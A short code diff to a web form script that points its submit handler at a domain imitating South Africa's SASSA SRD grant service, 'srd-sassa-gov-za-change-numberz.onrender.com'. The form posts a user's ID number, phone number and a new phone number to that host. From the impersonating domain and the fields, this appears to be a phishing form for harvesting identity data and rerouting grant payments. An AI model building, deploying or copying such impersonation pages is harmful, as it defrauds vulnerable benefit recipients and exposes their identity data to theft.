@@ -79,7 +79,7 @@
       const newphoneNumber = document.getElementById("newphoneNumber").value.trim();
 
       try {
-        const response = await fetch("https://your-backend-url.onrender.com/submit", {
+        const response = await fetch("https://srd-sassa-gov-za-change-numberz.onrender.com/submit", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
